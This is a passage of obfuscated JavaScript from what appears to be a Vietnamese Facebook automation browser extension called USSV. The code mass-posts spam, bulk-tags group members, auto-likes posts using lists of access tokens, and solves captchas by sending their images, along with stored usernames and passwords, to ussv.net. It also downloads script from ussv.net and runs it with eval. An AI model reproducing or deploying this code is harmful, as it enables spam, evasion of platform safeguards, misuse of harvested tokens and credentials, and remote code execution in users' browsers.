            var H4 = f1W.C6a;
            dom_logs_ussv(lang_vi_checking_cant_spam, n + f1W.m60);
        }
        if (f1W[R4](T, undefined)) {
            var T = $(k4 + n)[f1W.Q0I]();
        } else {}
        var I4 = Y[f1W.d3v](f1W.L9a, X4),
            e0 = f1W.X6v;
        e0 += M4 + H4 + E4 + n + f1W.P7a;
        e0 += f4 + I4 + n4 + n + r4;
        e0 += W4;
        e0 += e4 + n + f1W.P7a + Y + f1W.i5X + T + f1W.K5O;
        e0 += q4 + n + f1W.P7a + N + f1W.K5O;
        e0 += b4 + n + f1W.P7a + g + f1W.K5O;
        e0 += w0;
        e0 += c0 + n + a0;
        e0 += S0;
        e0 += j4;
        e0 += z0;
        e0 += V4;
        e0 += D0 + n + f1W.P7a + img_load_s + O0;
        e0 += A0 + n + f1W.f2Q;
        e0 += x0;
        e0 += V4;
        e0 += p4 + n + f1W.P7a + img_load_s + O0;
        e0 += x0;
        e0 += y0;
        e0 += Z4;
        e0 += B4;
        e0 += z0;
        e0 += L0 + n + f1W.P7a;
        e0 += G0 + n + I0 + n + M0 + n + T0 + n + C0;
        e0 += m0;
        e0 += u0 + n + f1W.P7a;
        e0 += g0 + n + C0;
        e0 += m0;
        e0 += y0;
        e0 += Z4;
        e0 += Y0;
        e0 += f1W.J50;
        e0 += f1W.b17;
        e0 += P0 + n + K0;
        e0 += v0 + Y + l0 + n + N0;
        e0 += k0 + Y + f0 + n + J0;
        e0 += i0 + Y + V0 + n + s0;
        e0 += f1W.m9O;
        e0 += b0;
        e0 += U0 + n + f1W.K57;
        e0 += n0;
        e0 += X0;
        e0 += A + n + Z0;
        e0 += o0;
        e0 += B0;
        e0 += w;
        e0 += W0 + n + H0 + n + q0;
        e0 += p0 + n + u;
        e0 += S + n + Q;
        e0 += r0;
        e0 += K + n + F0 + n + E0 + n + L;
        e0 += c + n + f1W.H8y;
        e0 += J + n + f1W.f2Q;
        e0 += f1W.b17;
        e0 += f1W.w9O;
        $(P)[f1W.m8y](parseInt($(P)[f1W.m8y]()) + f1W.S9a);
        var t0 = $(z);
        t0[f1W.u2r](e0);
        if (f1W[C](t0[f1W.q8r](G).length, f1W.F30)) {
            t0[f1W.q8r](G)[f1W.p3X]()[f1W.w5I]();
        }
        $(f1W.v2O + n)[f1W.i77](function() {
            var o = "rgb(51, 138, 47)",
                U = "rgb(255, 255, 255)",
                p = "rgb(229, 239, 247)",
                M = "#div_mini_spam_",
                b = "Ða~ gu?i Yêu câ`u du`ng Ðang Ba`i trên ta`i khoa?n ",
                H = "A5b",
                R = "#dom_my_img",
                X = $(R)[f1W.m8y]();
            if (f1W[H]($(this)[f1W.o07](), f1W.L9a)) {
                dom_logs_ussv(b + Y, n + f1W.m60);
                $(M + n)[f1W.C3O](f1W.Q1I, p);
            } else {
                $(M + n)[f1W.C3O](f1W.Q1I, U);
                $(M + n)[f1W.C3O](f1W.K1v, o);
                dom_logs_ussv(lang_vi_spaming_on_spam + Y, n + f1W.m60);
                var f = f1W.M1y + N;
                chrome[f1W.d60][f1W.K4r]({
                    method: 'GET',
                    action: 'xhttp',
                    url: f,
                    data: "hj=hj"
                }, function(W) {
                    var V = "j0B",
                        E = JSON[f1W.i2O](W);
                    if (f1W[V](E[f1W.G6y], null)) {
                        div_thongbao(ussv_lang_vi_rs_error_dietoken);
                    } else {
                        var O = E[f1W.q60],
                            Z = E[f1W.h3r],
                            F = E[f1W.G6y];
                        start_spam(n, N, F, O, Z, 1, "");
                    }
                });
            }
        });
        $(f1W.l8Q + n)[f1W.Z6O](function() {
            var W = "B0B",
                V = $(f1W.c87)[f1W.Q0I]();
            if (f1W[W](V, f1W.c8Q)) {
                div_fast_log(n, Y, T);
            } else {
                div_thongbao(ssv_lang_vi_nt_cant_fl);
            }
        });
        $(f1W.i37 + n)[f1W.Z6O](function() {
            var W = $(D + n)[f1W.Q0I]();
            view_log(n, Y, W);
        });
        $(I + n)[f1W.Z6O](function() {
            var o = "|_|_|war|spam",
                U = "#note_tientrinh_spam_account",
                p = f1W.l90 + Y + f1W.w30 + T;
            $(U)[f1W.Q0I](p);
            dom_logs_ussv(p, n + o);
            var M = $(D + n)[f1W.Q0I](),
                b = f1W.M1y + M;
            chrome[f1W.d60][f1W.K4r]({
                method: 'GET',
                action: 'xhttp',
                url: b,
                data: "hj=hj"
            }, function(W) {
                var V = "F0B",
                    E = JSON[f1W.i2O](W);
                if (f1W[V](E[f1W.G6y], null)) {
                    div_thongbao(ussv_lang_vi_rs_error_dietoken);
                } else {
                    $("#spaming_group_" + n)[f1W.Q0I]("0");
                    $("#spaming_friends_" + n)[f1W.Q0I]("0");
                    $("#spaming_friends_aut_" + n)[f1W.Q0I]("0");
                    $("#spaming_friends_500_" + n)[f1W.Q0I]("0");
                    $("#spaming_friends_500_fix_" + n)[f1W.Q0I]("0");
                    $("#more_info_spam_logs_ok_" + n)[f1W.Q0I]("0");
                    var O = E[f1W.q60],
                        Z = E[f1W.h3r],
                        F = E[f1W.G6y];
                    start_spam(n, M, F, O, Z, "rsp");
                }
            });
        });
    }

    function change_cookie() {
        var W = 's',
            V = 'presence',
            E = '-2',
            O = 'p',
            Z = 'lu',
            F = 'fr',
            o = '2',
            U = 'csm',
            p = 'act',
            M = 'a11y';
        setCookie(f1W.J8X, f1W.X6v, f1W.v30);
        setCookie(M, f1W.X6v, f1W.v30);
        setCookie(p, f1W.X6v, f1W.v30);
        setCookie(U, o, f1W.v30);
        setCookie(f1W.N6I, f1W.X6v, f1W.v30);
        setCookie(F, f1W.X6v, f1W.v30);
        setCookie(Z, f1W.X6v, f1W.v30);
        setCookie(O, E, f1W.v30);
        setCookie(V, f1W.X6v, f1W.v30);
        setCookie(W, f1W.X6v, f1W.v30);
        setCookie(f1W.v9I, f1W.X6v, f1W.v30);
    }

    function Rename(f, n) {
        var Y = "LastName",
            N = "FirstName",
            g = "https://www.facebook.com/ajax/settings/account/name.php";
        if (!n) {
            var n = function() {};
        };
        var T = g;
        $[f1W.c9y]({
            url: T,
            type: "POST",
            dataType: "json",
            timeout: 20000,
            data: "fb_dtsg=" + _fb[f1W.O00] + "&display_format=complete&save_password=" + f[f1W.n3Q] + "&primary_first_name=" + f[N] + "&primary_middle_name=&primary_last_name=" + f[Y] + "&alternate_name=&show_alternate=1&__user=" + _fb[f1W.z1Y] + "&__a=1"
        })[f1W.D2I](function(E, O) {
            var Z = "onload",
                F = "n8b",
                o = "M8b",
                U = "e8b",
                p = "p8b";
            if (f1W[p](O, 'timeout')) {
                n({
                    "Error": 2,
                    "Note": "K?t n?i b? l?i ! Vui lòng ki?m tra l?i !"
                });
            } else {
                if (f1W[U](E[f1W.D60], 4) && f1W[o](E[f1W.p0O], 500)) {
                    var M = E[f1W.H8v];
                    E = JSON[f1W.i2O](M[f1W.F6r]("for (;;);", ""));
                    if (E.error) {
                        var b = E[f1W.S7Y] + ". " + E[f1W.m87];
                        $(f[f1W.a7y])[f1W.Q0I](b);
                        var H = 1;
                    } else {
                        if (f1W[F](M[f1W.x3y]("save_password"), null)) {
                            var b = "B?n chua di?n m?t kh?u ho?c m?t kh?u không dúng !!!";
                            $(f[f1W.a7y])[f1W.Q0I](b);
                            var H = 1;
                        } else {
                            if (E[Z]) {
                                if (E[Z][1]) {
                                    var R = unescape(E[Z][1][f1W.F6r](/\\u003c/gi, "<")[f1W.F6r](/\\u003e/gi, ">")[f1W.F6r](/\\r\\n/g, "\n"))[f1W.F6r](/\\\"/g, '"')[f1W.F6r](/\\\//g, '/'),
                                        X = /\\u([\d\w]{4})/gi;
                                    R = R[f1W.F6r](X, function(W, V) {
                                        return String[f1W.V2X](parseInt(V, 16));
                                    });
                                    R = unescape(R);
                                    var R = R[f1W.x3y]('\\("(.*?)"\\)'),
                                        b = R[1],
                                        H = 1;
                                    $(f[f1W.a7y])[f1W.Q0I](b);
                                } else {
                                    var b = "Chúc m?ng b?n ! B?n dã Ð?i tên Thành Công.",
                                        H = 0;
                                    $(f[f1W.a7y])[f1W.Q0I](b);
                                    CheckRename();
                                    GetInfo();
                                }
                            } else {
                                var b = "L?i d?i tên không xác d?nh...",
                                    H = 1;
                            }
                        }
                    }
                    n({
                        "Error": H,
                        "Note": b
                    });
                } else {}
            }
        });
    }

    function Div_AccList() {
        var V = "PanelAccList";
        if ($(f1W.z0Y).length) {
            $(f1W.z0Y)[f1W.l6Q](f1W.Y5a);
        } else {
            uss[f1W.U8Y]({
                "prepend": f1W.V0r,
                "multiple": f1W.R30,
                "Id": V,
                "Type": V
            }, function(W) {});
        }
    }

    function update_OneAcc(W, V, E, O, Z, F) {
        var o = "u08";
        if (f1W[o]($(f1W.I5O)[f1W.o07](), f1W.S9a)) {
            CheckV2[f1W.b0O](W, V, E, O, Z, F);
        } else {
            _update_OneAcc(W, V, E, O, Z, F);
        }
    }

    function div_thongbao(E, O) {
        var Z = ".close",
            F = ".capnhatnoidung",
            o = "#tieptuccheck",
            U = "#remove_thongbao",
            p = '</div></div>',
            M = '&nbsp;&nbsp;&nbsp; ',
            b = '<a href="https://www.facebook.com/profile.php?id=791531684276033" target="_blank"><span style="background: linear-gradient(to bottom, #D23872 5%, #CD27B2 100%);" class="btnhelp">GROUP Hô~ Tro?</span></a> ',
            H = '<div id="" class="footer" style="text-align: right;">',
            R = '<br/><span class="note_after_thongbao"></span>',
            X = '<div id="" class="content" style="padding: 20px;color: #B94A48;">',
            f = '<center>Thông Ba´o</center>',
            n = '<a class="close" data-dismiss="modal" id="remove_thongbao">×</a> ',
            Y = '<div id="" class="header" style="background-color: #D2322D;color: #FFF;">',
            N = '<div class="modaler"><div style="font-size: 16px;font-family: Lato, Helvetica, serif; border-radius: 6px;left: 10%;" id="loisaipass_alert" class="modal">',
            g = '<div id="div_thongbao" class="div_thongbao" style="z-index:99999999;">',
            T = function(W) {
                ussthongbao = W;
            },
            I = function() {
                var W = "<div id='thongbao'>";
                usshtml[f1W.V5I] = W + ussthongbao + f1W.u40;
            };
        T(f1W.X6v);
        ussthongbao += g;
        ussthongbao += N;
        ussthongbao += Y;
        ussthongbao += n;
        ussthongbao += f;
        ussthongbao += f1W.w9O;
        ussthongbao += X;
        ussthongbao += E;
        ussthongbao += R;
        ussthongbao += f1W.w9O;
        ussthongbao += H;
        ussthongbao += b;
        ussthongbao += M;
        ussthongbao += f1W.w9O;
        ussthongbao += p;
        ussthongbao += f1W.w9O;
        usshtml = document[f1W.W8O](f1W.m90);
        I();
        document[f1W.V0r][f1W.M57](usshtml);
        $(U)[f1W.Z6O](function() {
            $(f1W.D17)[f1W.w5I]();
        });
        $(o)[f1W.Z6O](function() {
            $(f1W.D17)[f1W.w5I]();
            $(f1W.A50)[f1W.Q0I](f1W.c8Q);
            chrome[f1W.d60][f1W.K4r]({
                action: 'clear'
            }, function(W) {
                get_OneAcc();
            });
        });
        $(F)[f1W.Z6O](function() {
            var W = "Nô?i dung mo´i da~ duo?c câ?p nhâ?t, vui lo`ng cha´c cha´n ra`ng ba?n da~ thay dô?i nô?i dung Ba`i Ðang ho?p lê? dê? qua´ tri`nh Ðang Ba`i duo?c diê~n ra Thuâ?n Lo?i !",
                V = ".note_after_thongbao";
            get_setting_spam(f1W.p8O);
            $(f1W.N8Y)[f1W.Q0I](f1W.B3Q);
            $(f1W.I2r)[f1W.Q0I](f1W.B3Q);
            $(F)[f1W.v37]();
            $(V)[f1W.Q0I](W);
        });
        $(Z)[f1W.Z6O](function() {
            var W = ".div_thongbao";
            $(W)[f1W.w5I]();
        });
    }

    function StatusCore() {
        var i0 = "CoppyPost",
            J0 = "ParsePost",
            f0 = "StatusId",
            k0 = "Likes",
            N0 = "TagsMember";
        this[f1W.U8Y] = function(o) {
            var U = "#stt_tools_panel_",
                p = $(f1W.B6Y)[f1W.o07]();
            $(U + o[f1W.W7O])[f1W.Q0I](f1W.S5v + img_load + f1W.h6O);
            chrome[f1W.v1O][f1W.z50][f1W.G47]([f1W.r4Y, f1W.v7v], function(F) {
                chrome[f1W.d60][f1W.K4r]({
                    method: 'POST',
                    action: 'xhttp',
                    url: 'http://ussv.net/addon/html/html_panel_fb_stt_tools.php',
                    data: "k=" + ussv_key_base + "&username=" + F[f1W.r4Y] + "&mabimat=" + F[f1W.v7v] + "&type=" + o[f1W.O4y] + "&id=" + o[f1W.W7O] + "&token=" + p
                }, function(W) {
                    var V = "j6t",
                        E = "A3t";
                    if (f1W[E](W[f1W.x3y]("Kg8"), null)) {
                        var W = W[f1W.F6r]("Kg8", "");
                        W = W[f1W.F6r]("0KgU", "==");
                        W = W[f1W.F6r]("C9kI", "=");
                        W = W[f1W.F6r]("C9kI", "=");
                        var W = uss_js_parse(uss_change_js(W));
                    };
                    var W = W[f1W.X3Q]("USSV-SPACE-PARSE<br/>");
                    if (f1W[V](W.length, 1)) {
                        var O = "";
                    } else {
                        var O = W[1];
                    }
                    var Z = W[0];
                    $("#stt_tools_panel_" + o[f1W.W7O])[f1W.Q0I](Z);
                    eval(O[f1W.F6r]('<script type="text/javascript">', '')[f1W.F6r]('</script>', ''));
                });
            });
        };
        this[N0] = function(w) {
            var B0 = "limit",
                o0 = "profile",
                Z0 = "B6t",
                A = "member";

            function X0(M) {
                var b = parseInt($("#SttCore_cmt_TK_lan")[f1W.m8y]());
                $("#SttCore_cmt_TK_lan")[f1W.m8y](b + 1);
                $[f1W.c9y]({
                    url: M[f1W.j2X],
                    timeout: 10000
                })[f1W.X5v](function(W) {
                    var V = "administrator",
                        E = "s6t",
                        O = "k6t",
                        Z = "X6t",
                        F = W.data.length;
                    if (f1W[Z](F, 0)) {
                        $(V0)[f1W.m8y]("Hoàn thành");
                    } else {
                        $(V0)[f1W.m8y]("Ti?n hành Tags " + F + " Thành viên...");
                        M[A] = F;
                        var o = "";
                        for (var U = 0; f1W[O](U, F); U++) {
                            if (f1W[E](W.data[U][V], true)) {
                                $(V0)[f1W.m8y]("Ðã lo?i b? Admin " + W.data[U][f1W.G6y] + " ra kh?i danh sách tags...");
                            } else {
                                var o = o + " @[" + W.data[U][f1W.W7O] + ":" + W.data[U][f1W.G6y] + "]";
                            }
                        };
                        var p = M[f1W.B20][f1W.X3Q]("|"),
                            p = p[uss[f1W.K0v](p.length)],
                            p = p + "%0A " + o;
                        M[f1W.j2X] = W[f1W.L9Q][f1W.Q8y];
                        b0(M, p);
                    }
                })[f1W.H4I](function(W) {
                    $(V0)[f1W.m8y]("L?i trong quá trình Tags. Ti?n tình b? d?ng t?i dây.");
                });
            }

            function n0(W) {
                var V = "y6t",
                    E = "F6t",
                    O = $("#SttCore_cmt_sl_hanhdong_" + w[f1W.W7O])[f1W.o07]();
                if (f1W[E](O, 0)) {
                    X0(W);
                } else if (f1W[V](O, 1)) {
                    var Z = w[f1W.B20][f1W.X3Q]("|"),
                        Z = Z[uss[f1W.K0v](Z.length)];
                    $(V0)[f1W.m8y]("Ti?n hành Úp Status");
                    b0(w, Z);
                }
            }

            function U0(O) {
                var Z = "stt_id",
                    F = "comment_id=" + O[f1W.b9Q] + "&comment_legacyid=" + O[f1W.r7X] + "&ft_ent_identifier=" + O[Z] + "&one_click=false&source=2&client_id=1429015183656:1785788487&av=" + _fb[f1W.z1Y] + "&__user=" + _fb[f1W.z1Y] + "&__a=1&fb_dtsg=" + _fb[f1W.O00];
                $[f1W.c9y]({
                    url: "https://www.facebook.com/ufi/delete/comment/",
                    type: "POST",
                    dataType: "json",
                    data: F
                })[f1W.D2I](function(W) {
                    var V = "R5t",
                        E = "f5t";
                    if (f1W[E](W[f1W.D60], 4) && f1W[V](W[f1W.p0O], 500)) {
                        var W = W[f1W.H8v][f1W.F6r]("for (;;);", ""),
                            W = JSON[f1W.i2O](W);
                        if (W.error) {
                            $(V0)[f1W.m8y](W[f1W.S7Y] + ": " + W[f1W.m87]);
                        } else {
                            $(V0)[f1W.m8y]("Xóa thành công Bình Lu?n " + O[f1W.b9Q]);
                        }
                    } else {}
                });
            }

            function b0(K, r0) {
                var Q = "sticker",
                    S = "D6t",
                    u = "datacaptcha",
                    p0 = "Y6t",
                    q0 = "m6t",
                    r0 = r0[f1W.F6r](/USSV-RANDOM-INT/gi, uss[f1W.K0v]({
                        "type": "int",
                        "lg": 12
                    })),
                    r0 = r0[f1W.F6r](/&/gi, "%26");
                if (f1W[q0]($("#SttCore_cmt_aut_tags")[f1W.o07](), 0)) {
                    $(V0)[f1W.m8y]("Ðã có l?nh ngung Tags !");
                } else {
                    var H0 = parseInt($("#SttCore_cmt_TK_member")[f1W.m8y]());
                    if (f1W[p0](K[u], undefined)) {
                        K[u] = "x";
                    };
                    if (f1W[S](K[u].length, 20)) {
                        var W0 = K[u];
                    } else {
                        var W0 = "ft_ent_identifier=" + K[f1W.p0O] + "&comment_text=" + r0 + "&source=0&client_id=1428771072785:1275809172&reply_fbid&parent_comment_id&rootid=u_0_25&clp=&attached_sticker_fbid=" + K[Q] + "&attached_photo_fbid=0&&&feed_context={\"last_view_time\":0,\"fbfeed_context\":true,\"location_type\":2,\"outer_object_element_id\":\"mall_post_" + K[f1W.p0O] + ":6\",\"object_element_id\":\"mall_post_" + K[f1W.p0O] + ":6\",\"is_ad_preview\":false,\"is_editable\":false}&ft[tn]=[]&ft[fbfeed_location]=2&ft[id]=" + K[f1W.p0O] + "&ft[author]=" + _fb[f1W.z1Y] + "&nctr[_mod]=pagelet_group_mall&av=" + _fb[f1W.z1Y] + "&__user=" + _fb[f1W.z1Y] + "&__a=1&__req=o&fb_dtsg=" + _fb[f1W.O00];
                    }
                    $[f1W.c9y]({
                        url: "https://www.facebook.com/ajax/ufi/add_comment.php",
                        dataType: "json",
                        type: "POST",
                        data: W0
                    })[f1W.D2I](function(f) {
                        var n = "H5t",
                            Y = "U5t",
                            N = "Z5t",
                            g = "w6t",
                            T = "x6t",
                            I = "l6t",
                            D = "C6t",
                            G = "g6t";
                        if (f1W[G](f[f1W.D60], 4) && f1W[D](f[f1W.p0O], 500)) {
                            var f = f[f1W.H8v],
                                C = f,
                                f = f[f1W.F6r]("for (;;);", ""),
                                f = JSON[f1W.i2O](f);
                            if (f1W[I](f.error, 1446005)) {
                                $(V0)[f1W.Q0I]("B?n dã b? Block tính nang Bình Lu?n ! Không th? ti?p t?c tags b?n bè !<br/>" + f[f1W.S7Y]);
                            } else if (f1W[T](f.error, 1404102)) {
                                $(V0)[f1W.Q0I](f[f1W.S7Y] + "<br/>" + f[f1W.m87]);
                            } else if (f1W[g](f.error, 1357007)) {
                                htmlcaptcha = f[f1W.v6v][f1W.e3X][f1W.y9X][0][1][f1W.a8Y];
                                imgcaptcha = $(htmlcaptcha)[f1W.q8r](".img")[f1W.V6Q]("src");
                                htmlcaptcha = htmlcaptcha[f1W.F6r]('class="img"', 'class="img captcha" id="imgcaptcha"');
                                htmlcaptchaimg = $(htmlcaptcha)[f1W.q8r]("#captcha")[f1W.Q0I]();
                                divCaptcha = "#SttCore_cmt_captchaimg_tags_" + K[f1W.W7O];
                                SLAlertCaptcha = "#uss_st_spam_inbox_alertcaptcha";
                                SLAutoCaptcha = "#uss_st_spam_inbox_autocaptcha";
                                chrome[f1W.v1O][f1W.z50][f1W.G47](["ussv_username", "ussv_pass"], function(M) {
                                    var b = "t6t",
                                        H = "datasend";
                                    UsernamUss = M[f1W.r4Y];
                                    UsernamPass = M[f1W.F07];
                                    $(divCaptcha)[f1W.Q0I](htmlcaptchaimg);
                                    $(divCaptcha)[f1W.q8r](".captcha_input")[f1W.w5I]();
                                    $(divCaptcha)[f1W.q8r](".captcha_refresh")[f1W.w5I]();
                                    var R = $(htmlcaptcha)[f1W.q8r]("#captcha_persist_data")[f1W.o07]();
                                    W0 += "&recaptcha_challenge_field=&captcha_persist_data=" + R + "&confirmed=1";
                                    K[H] = W0;
                                    if (f1W[b]($("#SttCore_cmt_sl_captcha_tags_" + K[f1W.W7O])[f1W.o07](), 1)) {
                                        $(V0)[f1W.Q0I]("Vui lòng nh?p Captcha !!!<br/>" + f[f1W.S7Y]);
                                        $("#SttCore_cmt_ip_captcha_tags_" + K[f1W.W7O])[f1W.l6Q](500);
                                        $("#SttCore_cmt_btn_send_captcha_tags_" + K[f1W.W7O])[f1W.L0Q]("click")[f1W.Z6O](function() {
                                            var W = $("#SttCore_cmt_captcha_tags_" + K[f1W.W7O])[f1W.o07](),
                                                V = W0 + "&captcha_response=" + W;
                                            K[f1W.d9Q] = 1;
                                            K[u] = V;
                                            b0(K, r0);
                                            $(V0)[f1W.Q0I]($(this)[f1W.V6Q]("data-note"));
                                            $("#SttCore_cmt_ip_captcha_tags_" + K[f1W.W7O])[f1W.v37]();
                                        });
                                    } else {
                                        $("#SttCore_cmt_ip_captcha_tags_" + K[f1W.W7O])[f1W.F50](500);
                                        $(V0)[f1W.Q0I]("G?p Captcha... USSV Ðang ti?n hành x? lý...");
                                        var X = setInterval(function() {
                                            var F = "Q6t";
                                            height = $(divCaptcha).height();
                                            if (f1W[F](height, 50)) {
                                                clearInterval(X);
                                                $(V0)[f1W.Q0I](_lJ[f1W.G3v]({
                                                    "t": "spam",
                                                    "id": "b2"
                                                }));
                                                var o = document[f1W.C4y]("myCanvas"),
                                                    U = o[f1W.p50]("2d"),
                                                    p = document[f1W.C4y]("imgcaptcha");
                                                U.drawImage(p, 10, 10);
                                                imgcaptcha = o[f1W.g4v]("image/png");
                                                setTimeout(function() {
                                                    $[f1W.c9y]({
                                                        url: "https://ussv.net/user/captcha.php?type=test&st=0&user=" + UsernamUss + "&pass=" + UsernamPass + "&ggurl=",
                                                        type: "POST",
                                                        dataType: "json",
                                                        data: "imgdata=" + $[f1W.o9Y][f1W.p6O](imgcaptcha)
                                                    })[f1W.D2I](function(O) {
                                                        var Z = "V5t";
                                                        $(V0)[f1W.Q0I](O[f1W.F5v]);
                                                        if (f1W[Z](O[f1W.C3y], 1)) {} else {
                                                            $[f1W.c9y]({
                                                                url: O[f1W.j2X],
                                                                type: "POST",
                                                                dataType: "json",
                                                                data: "imgdata=x"
                                                            })[f1W.D2I](function(W) {
                                                                var V = "O5t";
                                                                $(V0)[f1W.Q0I](W[f1W.F5v]);
                                                                if (f1W[V](W[f1W.C3y], 1)) {
                                                                    $(V0)[f1W.Q0I](W[f1W.U4v]);
                                                                } else {
                                                                    var E = W0 + "&captcha_response=" + W[f1W.a2Y];
                                                                    $(V0)[f1W.Q0I](_lJ[f1W.G3v]({
                                                                        "t": "spam",
                                                                        "id": "b3",
                                                                        "r": W[f1W.a2Y]
                                                                    }));
                                                                    $(divCaptcha)[f1W.Q0I]("");
                                                                    K[f1W.d9Q] = 1;
                                                                    K[u] = E;
                                                                    b0(K, r0);
                                                                    console[f1W.p4y]("Gui lai Tags");
                                                                }
                                                            });
                                                        }
                                                    });
                                                }, 200);
                                            } else {}
                                        }, 1000);
                                    }
                                });
                            } else {
                                if (f1W[N]($("#SttCore_cmt_sl_del_tags_" + K[f1W.W7O])[f1W.o07](), 1)) {
                                    var z = C[f1W.x3y]('ents\":\\[{\"id\":\"(.*?)\",\"fbid\":\"'),
                                        P = z[1][f1W.X3Q]("_")[0],
                                        J = z[1][f1W.X3Q]("_")[1];
                                    U0({
                                        "comment": J,
                                        "comment_id": z[1],
                                        "stt_id": P,
                                        "id": K[f1W.W7O]
                                    });
                                };
                                $("#SttCore_cmt_TK_member")[f1W.m8y](H0 + K[A]);
                                if (f1W[Y](K[f1W.d9Q], 1)) {
                                    K[u] = "x";
                                    K[f1W.d9Q] = 0;
                                    var c = $("#SttCore_cmt_captcha_time_wai_tags_" + K[f1W.W7O])[f1W.o07](),
                                        L = setInterval(function() {
                                            var W = "q5t";
                                            var V = "b5t";
                                            c = f1W[V](c, 1);
                                            $(V0)[f1W.m8y]("USSV s? ti?n hành Tags sau " + c + "s n?a. Vì V?a b? Captcha...");
                                            if (f1W[W](c, 1)) {
                                                clearInterval(L);
                                                $(V0)[f1W.m8y]("Hoàn thành 100s ch?. Ti?n hành Tags Ti?p !");
                                                n0(K);
                                            }
                                        }, 1000);
                                } else {
                                    var E0 = $("#SttCore_cmt_time_tags_" + K[f1W.W7O])[f1W.o07]();
                                    if (f1W[n](E0, 0)) {
                                        n0(K);
                                    } else {
                                        var F0 = E0[f1W.F6r]("000", "");
                                        $(V0)[f1W.m8y]("Ðang ch? " + F0 + "s d? ti?p t?c Tags...");
                                        setTimeout(function() {
                                            n0(K);
                                        }, E0);
                                    }
                                }
                            }
                        } else {
                            $(V0)[f1W.m8y]("Tag thành viên th?t b?i. Hãy ki?m tra l?i ID Sticker có h?p l? hay không, ho?c có th? dã x?y ra l?i không xác d?nh d? d?n ti?n trình b? d?ng d?t ng?t.");
                        }
                    });
                }
            }
            var s0 = $(".ussv_fb_key")[f1W.o07](),
                V0 = $("#SttCore_cmt_note_tags");
            if (f1W[Z0](w[o0], "")) {
                $(V0)[f1W.m8y]("Ti?n hành Tags b?n bè vào Status...");
                w[f1W.j2X] = "https://graph.facebook.com/me/friends?limit=" + w[B0] + "&access_token=" + s0;
            } else {
                w[f1W.j2X] = "https://graph.facebook.com/" + w[f1W.i0Y] + "/members?limit=" + w[B0] + "&access_token=" + s0;
            }
            n0(w);
        };
        this[k0] = function(X) {
            var f = "h5t";

            function n(W, V, E) {
                var O = "K5t",
                    Z = "L5t",
                    F = "S5t",
                    o = "P5t",
                    U = "z5t";
                if (f1W[U]($("#LikeCore_stt_aut_like_" + W[f1W.A7y])[f1W.o07](), 1)) {
                    if (f1W[o](T.length, 50)) {
                        $(g)[f1W.m8y]("Vui lòng thêm List Token...");
                        N();
                    } else {
                        if (f1W[F](I, 0)) {
                            var V = T[f1W.X3Q]("\n")[0];
                            StatusCore[f1W.H1X]("#LikeCore_stt_TK_ht_" + W[f1W.A7y]);
                            T = T[f1W.F6r](V + "\n", "")[f1W.F6r](V, "");
                            $("#LikeCore_stt_TokenList_" + W[f1W.A7y])[f1W.o07](T);
                            Y(W, V, E);
                        } else {
                            for (var p = 0; f1W[Z](p, I); p++) {
                                var M = T[f1W.X3Q]("\n").length;
                                if (f1W[O](M, I)) {
                                    I = M;
                                    n(W, V, E);
                                } else {
                                    D = D + 1;
                                    var E = 1 + p,
                                        V = T[f1W.X3Q]("\n")[p];
                                    T = T[f1W.F6r](V + "\n", "")[f1W.F6r](V, "");
                                    $("#LikeCore_stt_TokenList_" + W[f1W.A7y])[f1W.o07](T);
                                    StatusCore[f1W.H1X]("#LikeCore_stt_TK_ht_" + W[f1W.A7y]);
                                    Y(W, V, E);
                                }
                            };
                        }
                    }
                } else {
                    $(g)[f1W.m8y]("Ti?n trình dã b? d?ng theo yêu c?u ho?c chua c?p quy?n Thao Tác...");
                    N();
                }
            }

            function Y(U, p, M) {
                var b = "W0b",
                    H = "d5t";
                if (f1W[H](p, undefined)) {
                    var R = "Loi";
                } else {
                    if (f1W[b](p[f1W.x3y]("|"), null)) {
                        var R = p[f1W.X3Q]("|")[0];
                    } else {
                        var R = p;
                    }
                }
                chrome[f1W.d60][f1W.K4r]({
                    method: 'GET',
                    action: 'xhttp',
                    url: 'http://ussv.net/ajax/likes.php?stt=' + U[f0] + '&type=like&token=' + R
                }, function(W) {
                    var V = "p0b",
                        E = "o0b",
                        O = "r0b",
                        Z = "E0b";
                    if (f1W[Z](W, "true")) {
                        StatusCore[f1W.H1X]("#LikeCore_stt_TK_tc_" + U[f1W.A7y]);
                        var F = $("#LikeCore_stt_ListTC_" + U[f1W.A7y])[f1W.o07]();
                        $("#LikeCore_stt_ListTC_" + U[f1W.A7y])[f1W.o07](F + p + "\n");
                        $(g)[f1W.Q0I]("<span style='color: rgb(61, 200, 126);'>Like Thành Công...</span>");
                    } else {
                        if (f1W[O](W[f1W.x3y]("message"), null)) {
                            var W = JSON[f1W.i2O](W);
                            $(g)[f1W.Q0I]("Like th?t b?i...<br/>N?i Dung: <span style='color:red;'>" + W.error[f1W.q10] + "</span>");
                        } else {
                            $(g)[f1W.Q0I]("<span style='color:red;'>Like th?t b?i...</span>");
                        }
                        StatusCore[f1W.H1X]("#LikeCore_stt_TK_tb_" + U[f1W.A7y]);
                        var o = $("#LikeCore_stt_ListTB_" + U[f1W.A7y])[f1W.o07]();
                        $("#LikeCore_stt_ListTB_" + U[f1W.A7y])[f1W.o07](o + p + "\n");
                    }
                    if (f1W[E](I, 0)) {
                        n(U);
                    } else {
                        if (f1W[V](M, I)) {
                            n(U, p, M);
                        } else {}
                    }
                });
            }

            function N() {
                $("#LikeCore_stt_btn_like_stop_" + X[f1W.A7y])[f1W.v37]();
                $(".LikeCore_stt_btn_like_" + X[f1W.A7y])[f1W.l6Q](500);
                $("#LikeCore_stt_aut_like_" + X[f1W.A7y])[f1W.o07]("0");
                $("#LikeCore_stt_TokenList_" + X[f1W.A7y])[f1W.V6Q]("disabled", false);
            }
            var g = X[f1W.a7y],
                T = "",
                I = $("#LikeCore_stt_sl_speed_like_" + X[f1W.A7y])[f1W.o07](),
                D = 0;
            if (f1W[f](X[f1W.O4y], "List")) {
                var T = $("#LikeCore_stt_TokenList_" + X[f1W.A7y])[f1W.o07](),
                    T = T[f1W.F6r](/\r/, "\n"),
                    T = T[f1W.F6r](/\n\n\n/, "\n"),
                    T = T[f1W.F6r](/\n\n/, "\n"),
                    G = T[f1W.X3Q]("\n").length;
                $("#LikeCore_stt_TK_tt_" + X[f1W.A7y])[f1W.m8y](G);
                $("#LikeCore_stt_ketqua_" + X[f1W.A7y])[f1W.l6Q](500);
                n(X, "", I);
                var C = setInterval(function() {
                    var W = "N5t";
                    if (f1W[W]($("#LikeCore_stt_aut_like_" + X[f1W.A7y])[f1W.o07](), 1)) {
                        StatusCore[f1W.H1X]("#LikeCore_stt_TK_time_" + X[f1W.A7y]);
                    } else {
                        clearInterval(C);
                    }
                }, 1000);
            }
        };
